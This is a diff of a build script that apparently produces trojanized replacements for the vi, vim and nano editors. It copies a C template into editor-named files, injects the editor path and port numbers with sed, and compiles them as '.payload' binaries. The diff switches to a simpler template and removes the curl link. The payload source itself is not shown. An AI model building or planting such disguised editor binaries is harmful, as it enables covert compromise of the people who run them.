@@ -23,9 +23,9 @@ NANO_EDITOR="/usr/bin/nano"
 NANO_PORT="5006"
 
 #Copy files
-cp editor_over.c vi.c
-cp editor_over.c vim.c
-cp editor_over.c nano.c
+cp editor_over_simple.c vi.c
+cp editor_over_simple.c vim.c
+cp editor_over_simple.c nano.c
 
 #Replace DEFINE strings with variables
 #VI
@@ -53,9 +53,9 @@ sed -i "s#{EDITOR}#$NANO_EDITOR#" nano.c
 sed -i "s#6969#$NANO_PORT#" nano.c
 
 #Compile binaries
-gcc vi.c -lcurl -o vi.payload
-gcc vim.c -lcurl -o vim.payload
-gcc nano.c -lcurl -o nano.payload
+gcc vi.c -o vi.payload
+gcc vim.c -o vim.payload
+gcc nano.c -o nano.payload
 
 #Remove c files
 rm vi.c
